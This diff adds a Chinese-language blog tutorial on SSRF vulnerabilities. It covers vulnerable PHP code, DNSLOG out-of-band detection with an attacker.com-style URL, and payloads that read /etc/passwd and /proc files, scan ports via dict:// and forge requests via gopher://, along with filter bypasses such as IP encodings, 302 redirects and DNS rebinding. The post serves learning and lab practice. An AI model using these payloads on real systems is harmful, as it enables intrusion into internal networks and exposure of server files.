@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"pop","path":"2025/07/07/pop/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"}]`)
+  const posts = JSON.parse(`[{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"pop","path":"2025/07/07/pop/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -264,7 +264,7 @@
         </a>
         <a href="/tags">
           <div>
-            <span>4</span>
+            <span>5</span>
             <span>标签</span>
           </div>
         </a>
@@ -364,7 +364,7 @@
           
           <div class="article-info--tags">
             <span>标签：</span>
-            
+            <a class="tag-link" href="/tags/SSRF/" rel="tag">SSRF</a>
           </div>
           
           <p class="article-info--date">日期：2025-08-14 14:56:03</p>
@@ -373,7 +373,273 @@
       </div>
     </div>
     <article class="article-content markdown-body">
-      
+      <h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="SSRF漏洞简介"><a href="#SSRF漏洞简介" class="headerlink" title="SSRF漏洞简介"></a>SSRF漏洞简介</h2><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p>
+<h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/dbe8fd8a68c4311cdf3e91b57565c588-17523861115531.png" class="" title="img">
+
+<p><strong>攻击目标</strong>：外网不能访问内网端口，主机</p>
+<p><strong>危害</strong>：</p>
+<p>1.读取本地文件</p>
+<p>2.服务器本地，内网端口扫描</p>
+<p>3.内网存活主机探测</p>
+<p>4.攻击内网应用</p>
+<p><strong>漏洞函数</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()、fsockopen()、curl_exec()</span><br></pre></td></tr></table></figure>
+
+<p>(1)file_get_contents()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p>
+<p>（2）fsockopen()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
+<p>（3）curl_exec()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>curl_exec</code>函数用于执行指定的cURL会话</p>
+<h2 id="SSRF漏洞验证方式"><a href="#SSRF漏洞验证方式" class="headerlink" title="SSRF漏洞验证方式"></a>SSRF漏洞验证方式</h2><p>1.该资源地址类型为 <a target="_blank" rel="noopener" href="http://www.xxx.com/a.php?image=URL,URL%E5%8F%82%E6%95%B0%E8%8B%A5%E6%98%AF%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p>
+<p>2.DNSLOG外带测试</p>
+<p>原理：（1）当目标服务器存在SSRF漏洞时，可控参数（如 <code>?url=http://attacker.com</code>）可能使服务器发起HTTP&#x2F;DNS请求。</p>
+<p>​     （2）如果目标服务器解析并请求了 <strong><code>[your-domain].dnslog.cn</code></strong>，则会在DNSLOG平台留下记录，证明漏洞存在。</p>
+<p>解读：目标服务器极为存在存在缺陷的web应用，可控参数就是我们从dnslog平台上获取的地址，当ssrf漏洞存在时，有漏洞的web应用也就是目标服务器就会去向我们从dnslog平台上获取的地址发去http请求，这样dnslog平台就会有记录，由此可证明是否纯在ssrf漏洞</p>
+<p>步骤：</p>
+<ol>
+<li>获取DNSLOG域名（如 <code>abc123.dnslog.cn</code>）</li>
+<li>构造Payload并发送（<code>?url=http://abc123.dnslog.cn</code>）</li>
+<li>检查DNSLOG平台是否有查询记录</li>
+<li>确认SSRF漏洞存在后，进一步利用（如探测内网、读取文件等）</li>
+</ol>
+<p>3.抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p>
+<ul>
+<li>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</li>
+<li>通过二级域名暴力猜解工具模糊猜测内网地址</li>
+<li>通过file协议读取内网信息获取相关地址</li>
+</ul>
+<p>4.回显型ssrf</p>
+<p>当SSRF漏洞<strong>有回显</strong>时，可通过返回的 <strong>HTTP响应头、页面标题、内容</strong> 判断是否成功请求目标资源。</p>
+<p><strong>（1）检测方法</strong></p>
+<p><strong>① 检查HTTP响应头（Server&#x2F;Banner信息）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /ssrf.php?url=http://example.com HTTP/1.1</span><br><span class="line">Host: target.com</span><br></pre></td></tr></table></figure>
+
+<p>响应头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.18.0  &lt;!-- 目标服务器的Banner（具体信息） --&gt;</span><br><span class="line">X-Powered-By: PHP/7.4  //后端语言版本</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Example Domain&lt;/title&gt;  &lt;!-- 请求的页面标题 --&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果返回的 <code>Server</code>、<code>X-Powered-By</code> 是 <strong>example.com</strong> 的而非 <code>target.com</code> 的，说明请求由服务端代理。</li>
+</ul>
+<p>5.无回显ssrf</p>
+<p>当SSRF <strong>无回显</strong> 时，可通过 <strong>响应时间、状态码、页面长度</strong> 等差异判断漏洞是否存在（类似布尔SQL盲注）。</p>
+<p><strong>（1）检测方法</strong></p>
+<p><strong>① 基于响应时间差异</strong></p>
+<ul>
+<li>请求一个 <strong>存在&#x2F;不存在</strong> 的端口，对比响应时间：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ssrf.php?url=http://192.168.1.1:80     &lt;!-- 开放HTTP服务，响应快 --&gt;</span><br><span class="line">/ssrf.php?url=http://192.168.1.1:9999   &lt;!-- 关闭端口，响应慢或超时 --&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>② 基于HTTP状态码</strong></p>
+<p>请求不同服务，观察状态码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ssrf.php?url=http://127.0.0.1:3306  --&gt; 返回500（MySQL未开HTTP服务）</span><br><span class="line">/ssrf.php?url=http://127.0.0.1:80    --&gt; 返回200（Web服务正常）</span><br></pre></td></tr></table></figure>
+
+<p><strong>③ 基于页面长度差异</strong></p>
+<ul>
+<li>使用Burp Intruder爆破内网IP，筛选不同长度的响应：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ssrf.php?url=http://192.168.1.1      --&gt; 返回长度=1200</span><br><span class="line">/ssrf.php?url=http://192.168.1.2      --&gt; 返回长度=0（无服务）</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞可能出现点"><a href="#漏洞可能出现点" class="headerlink" title="漏洞可能出现点"></a>漏洞可能出现点</h2><p>（1） 分享功能：通过URL地址分享文章等，例如如下地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://share.xxx.com/index.php?url=http://www.xxx.com</span><br></pre></td></tr></table></figure>
+
+<p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p>
+<p>（2）图片加载&#x2F;下载：通过URL地址加载或下载图片：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://image.xxx.com/image.php?image=http://www.xxx.com</span><br></pre></td></tr></table></figure>
+
+<p>图片加载存在于很多的编辑器中，编辑器上传图片处加载设定好的远程服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p>
+<p>（3）图片&#x2F;文章收藏功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/xxx</span><br></pre></td></tr></table></figure>
+
+<p>（4）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</p>
+<p>（5）在线翻译：给网址翻译对应网页的内容。</p>
+<p>（6）邮件系统：比如接收邮件服务器地址。</p>
+<p>（7）利用参数中的关键字查找：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain...</span><br></pre></td></tr></table></figure>
+
+<p><strong>总的来说，需要从远程服务器请求资源的网站都有可能存在SSRF漏洞</strong>。</p>
+<h2 id="漏洞利用（URL的伪协议）"><a href="#漏洞利用（URL的伪协议）" class="headerlink" title="漏洞利用（URL的伪协议）"></a>漏洞利用（URL的伪协议）</h2><p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-内网访问"><a href="#1-内网访问" class="headerlink" title="1.内网访问"></a>1.内网访问</h3><p>利用SSRF漏洞访问内网中的Web应用或其他服务。通过构造特定的URL，攻击者可以访问内网中的敏感资源。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="2-读取文件（file协议）（查找内网存活主机ip）"><a href="#2-读取文件（file协议）（查找内网存活主机ip）" class="headerlink" title="2.读取文件（file协议）（查找内网存活主机ip）"></a>2.读取文件（file协议）（查找内网存活主机ip）</h3><p>利用file协议读取本地文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///etc/passwd</span><br><span class="line">file:///etc/hosts(查看服务器有几个网段)</span><br><span class="line">file:///proc/net/arp(查看高速缓存，寻找内网其他存活主机)</span><br><span class="line">file:///proc/net/fib_trie(显示当前网段路由信息)</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-端口扫描-dict协议-（查找内网主机开放端口）"><a href="#3-端口扫描-dict协议-（查找内网主机开放端口）" class="headerlink" title="3.端口扫描(dict协议)（查找内网主机开放端口）"></a>3.端口扫描(dict协议)（查找内网主机开放端口）</h3><p>利用ssrf漏洞扫描内网中的开放端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://127.0.0.1:8000</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/dbe8fd8a68c4311cdf3e91b57565c588-17523861115531.png" class="" title="img">
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/image-20250808160533884-17546403362731.png" class="" title="image-20250808160533884">
+
+<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="4-http伪协议（目录扫描获取子页面）"><a href="#4-http伪协议（目录扫描获取子页面）" class="headerlink" title="4.http伪协议（目录扫描获取子页面）"></a>4.http伪协议（目录扫描获取子页面）</h3><img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/image-20250808163327195-17546420088232.png" class="" title="image-20250808163327195">
+
+<p>通过将这个页面拦截下然后发到攻击模块，然后将indexhuozeindex.php标记起来，导入我们实现用来目录扫描的字典，开始攻击，然后根据页面的长度判断这个页面是否存在</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/image-20250808163605914-17546421680523.png" class="" title="image-20250808163605914">
+
+<p>像方框里的这三个就是存在的页面</p>
+<h3 id="5-发送get，post请求（gopher协议）"><a href="#5-发送get，post请求（gopher协议）" class="headerlink" title="5.发送get，post请求（gopher协议）"></a>5.发送get，post请求（gopher协议）</h3><p><strong>gopher伪协议</strong></p>
+<p>基本格式就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://ip：端口号/gopher提交的内容</span><br></pre></td></tr></table></figure>
+
+<p>gopher伪协议默认端口时70</p>
+<p>gopher请求不转发第一个字符，所以在请求内容之前需要加一个填充位_</p>
+<h4 id="get提交"><a href="#get提交" class="headerlink" title="get提交"></a>get提交</h4><img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/image-20250808170026271-17546436284805.png" class="" title="image-20250808170026271">
+
+<p>操作</p>
+<p>为了方面自己可以不写url编码的payload像上面那个一样另一种做法是先</p>
+<p>gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_</p>
+<p>抓这个界面的包，然后</p>
+<p>GET &#x2F;name.php?name&#x3D;benben HTTP&#x2F;1.1<br>Host: 172.250.250.4</p>
+<p>将这些复制在url里面</p>
+<p>并且将这些url编码两次（目的是让请求到达被攻击者主机时正好被url解码成正常的字符）</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/image-20250808171103452-17546442652246.png" class="" title="image-20250808171103452">
+
+
+
+<h4 id="post提交"><a href="#post提交" class="headerlink" title="post提交"></a>post提交</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /name.php HTTP/1.1</span><br><span class="line">Host: 172.250.250.4</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">name=jianjian</span><br></pre></td></tr></table></figure>
+
+<p>将这段代码url编码以下放在</p>
+<p>gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_</p>
+<p>后面即可</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/image-20250808172841690-17546453236827.png" class="" title="image-20250808172841690">
+
+
+
+<h2 id="ssrf绕过方式"><a href="#ssrf绕过方式" class="headerlink" title="ssrf绕过方式"></a>ssrf绕过方式</h2><p><strong>1、绕过限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
+<p>可以尝试采用http基本身份认证的方式绕过<br>如：<a target="_blank" rel="noopener" href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</a><br>在PHP的parse_url中会识别<a target="_blank" rel="noopener" href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p>
+<p><strong>2、绕过限制请求IP不为内网地址：</strong></p>
+<p>（1）采用短网址绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如百度短地址https://dwz.cn/</span><br></pre></td></tr></table></figure>
+
+<p>（2）利用特殊域名，xip.io可以指向任意域名（原理是DNS解析），即 127.0.0.1.xip.io，可以解析为127.0.0.1</p>
+<p>（3）采用进制转换，127.0.0.1 八进制：<code>0177.0.0.1</code>；十六进制：<code>0x7f.0.0.1</code>；十进制：<code>2130706433</code></p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/image-20250809151156660-17547235179971.png" class="" title="image-20250809151156660">
+
+
+
+<p>（4）利用<code>[::]</code>，<code>http://[::]:80/</code> 会解析为 <code>http://127.0.0.1</code></p>
+<p>（5）添加端口号，<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
+<p>（6）利用句号，<code>127。0。0。1</code> 会解析为 127.0.0.1</p>
+<p><strong>3.限制请求只为http协议</strong></p>
+<p>（1）<strong>采取302跳转</strong></p>
+<p>若传入的私网地址被限制可以使用302重定向绕过。这需要一台公网服务器和它的公网IP，在服务器中创建重定向的代码文件，提交公网IP路径下的重定向代码文件，使SSRF漏洞服务器访问从而重定向到自己内网地址或本机地址。</p>
+<p>重定向文件代码文件如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Location: http://127.0.0.1/flag.php&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>绕过原理如下</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/image-20250809151656368-17547238183592.png" class="" title="image-20250809151656368">
+
+
+
+<p>也就是将公网服务器作为跳板，在明面上访问的是公网服务器实则公网服务器利用我们刚写入的重定向代码文件302重定向到ssrf漏洞服务器也就是我们想要访问的本地，就实现了通过访问公网服务器的url达到拿到我们想访问的本地界面</p>
+<p>为了做实验我们需要先自己搭建一个公网服务器</p>
+<p>贝锐花生壳+小皮面板</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/21ee72024509490de4db43196d5bd40a-17548219151774.png" class="" title="21ee72024509490de4db43196d5bd40a">
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/059e945129f264941124c83ba5b67ec7-17548219521365.png" class="" title="059e945129f264941124c83ba5b67ec7">
+
+<p>然后开启小皮面板</p>
+<p>开启nginx服务</p>
+<p>然后创建一个端口对应88的站点</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/698b222f3be3daf4c4e2a7c4e39014b5-17548220182316.png" class="" title="698b222f3be3daf4c4e2a7c4e39014b5">
+
+<p>然后再打开这个网站的根目录，创建一个index.php文件将上面的重定向的代码文件写入</p>
+<p>准备工作做好，打开靶场之后</p>
+<p>访问公网ip即可</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/cefb6e69769d6e4fbcc3b791c68a79bb-17548221079897-17548221322298.png" class="" title="cefb6e69769d6e4fbcc3b791c68a79bb">
+
+<p>（2） <strong>DNS重绑定</strong></p>
+<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
+<p><strong>传统的 SSRF 过滤流程通常包括以下步骤：</strong></p>
+<ol>
+<li><strong>从输入的 URL 中提取 Host。</strong></li>
+<li><strong>对 Host 进行 DNS 解析，获取解析的 IP。</strong></li>
+<li><strong>检测该 IP 是否合法（如是否是私有 IP）。</strong></li>
+<li><strong>如果 IP 合法，则发起请求。</strong></li>
+</ol>
+<p>这个流程中存在两次 DNS 解析：第一次用于检查合法性，第二次用于实际发起请求。攻击者可以利用这两者之间的时间差，通过 DNS 重绑定技术，使域名在第二次解析时指向恶意 IP。</p>
+<p>攻击者需要控制一个 DNS 服务器，并将目标域名的 TTL 设置为非常短的时间（如 0），以防止 DNS 缓存。而以上工具允许攻击者快速设置和管理 DNS 重绑定攻击，而无需自己搭建 DNS 服务器。</p>
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/944cbec1a057be503525aad186bb992c.png" class="" title="img">
+
+<img src="/2025/08/14/SSRF%E6%BC%8F%E6%B4%9E/7f5a3b3d6253121e500938f4c645c900.png" class="" title="img">
+
+<p><strong>利用封闭字母数字</strong></p>
+<p>封闭字母数字（Enclosed Alphanumerics）是一组特殊的 Unicode 字符，这些字符在某些情况下可以被浏览器或解析器识别为普通的字母数字字符。利用这些字符可以绕过对特定域名或IP地址的过滤。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://127.0.0.1&gt;&gt;&gt;http://①②⑦｡⓪。⓪。①</span><br><span class="line">List: </span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+
